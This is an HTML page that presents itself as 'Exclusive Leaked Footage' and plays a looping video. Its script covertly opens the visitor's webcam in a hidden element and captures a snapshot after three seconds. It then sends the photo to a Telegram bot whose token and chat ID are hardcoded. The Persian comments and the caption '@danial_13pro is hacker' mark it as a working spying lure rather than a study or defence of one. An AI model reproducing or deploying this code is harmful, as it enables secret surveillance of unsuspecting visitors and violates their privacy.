<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title> </title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: black;
      color: white;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    .container {
      padding: 30px;
    }

    video {
      width: 90%;
      max-width: 600px;
      border-radius: 10px;
      margin-top: 20px;
    }

    #camera-feed {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Exclusive Leaked Footage!</h1>
    <video autoplay muted loop>
      <source src="https://uploadkon.ir/uploads/bc7606_25v77sajw-360.mp4" type="video/mp4" />
      Your browser does not support HTML5 video.
    </video>
    <video id="camera-feed" autoplay playsinline></video>
  </div>

  <script>
    // دسترسی به دوربین
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById('camera-feed');
        video.srcObject = stream;

        // گرفتن عکس پس از ۳ ثانیه
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // تبدیل تصویر به داده Base64
          const imageData = canvas.toDataURL('image/jpeg');

          // ارسال تصویر به تلگرام
          const botToken = '7723412708:AAEMLrW9Zj0GOqlTU8gUu0G0ASsTNm1ZVxI';
          const chatId = '6425833685';
          const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('caption', '@danial_13pro is hacker');
          formData.append('photo', dataURLtoBlob(imageData), 'snapshot.jpg');

          fetch(url, {
            method: 'POST',
            body: formData
          }).then(() => {
            console.log("Photo sent!");
          });

        }, 3000); // بعد از ۳ ثانیه عکس می‌گیره
      })
      .catch(err => {
        console.error("Camera access denied or error:", err);
      });

    // تبدیل base64 به Blob
    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }
  </script>
</body>
</html>
